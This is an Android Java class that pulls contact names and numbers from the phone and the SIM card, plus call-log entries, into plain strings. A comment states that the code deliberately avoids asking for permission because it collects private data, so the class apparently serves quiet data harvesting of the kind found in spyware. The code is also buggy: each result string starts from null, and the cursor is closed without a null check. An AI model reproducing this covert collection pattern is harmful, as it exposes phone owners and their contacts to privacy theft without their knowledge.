package com.xxiong.acacia;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.content.ContextCompat;

/**
 * 收集手机中联系人信息
 * Created by Ekira on 2016/6/30.
 */
public class ContactGather {
    private Context context = null;
    private static final String[] PHONES_PROJECTION = new String[]{
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER};
    private static final String[] CALL_LOG = new String[]{
            CallLog.Calls.NUMBER,
            CallLog.Calls.TYPE,
            CallLog.Calls.DATE};

    public ContactGather(Context context1) {
        context = context1;
    }

    /**
     * 收集存储在手机中的联系人信息
     * @return 联系人信息字符串
     */
    public String getPhoneContacts() {
        String contacts = null;
        ContentResolver resolver = context.getContentResolver();
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            // 由于这里执行的是获取用户隐私的操作，所以不发出请求权限申请
            return "Access Phone Content Permission deny.";
        }
        Cursor cursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, PHONES_PROJECTION, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(1);
                String name = cursor.getString(0);
                contacts += name + ":" + number + "\n";
            }
        }
        cursor.close();
        return contacts;
    }

    /**
     * 收集sim卡中的联系人信息
     * @return 联系人信息字符串
     */
    public String getSIMContacts() {
        String contacts = null;
        ContentResolver resolver = context.getContentResolver();
        Uri uri = Uri.parse("content://icc/adn");
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            return "Access SIM Content Permission deny.";
        }
        Cursor cursor = resolver.query(uri, PHONES_PROJECTION, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(1);
                String name = cursor.getString(0);
                contacts += name + ":" + number + "\n";
            }
        }
        cursor.close();
        return contacts;
    }

    public String getCallLog() {
        String contacts = null;
        ContentResolver resolver = context.getContentResolver();
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return "Access Call Log Permission deny.";
        }
        Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI, CALL_LOG, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(0);
                String type = cursor.getString(1);
                String date = cursor.getString(2);
                contacts += number + ":" + type + ":" + date + "\n";
            }
        }
        cursor.close();
        return contacts;
    }
}

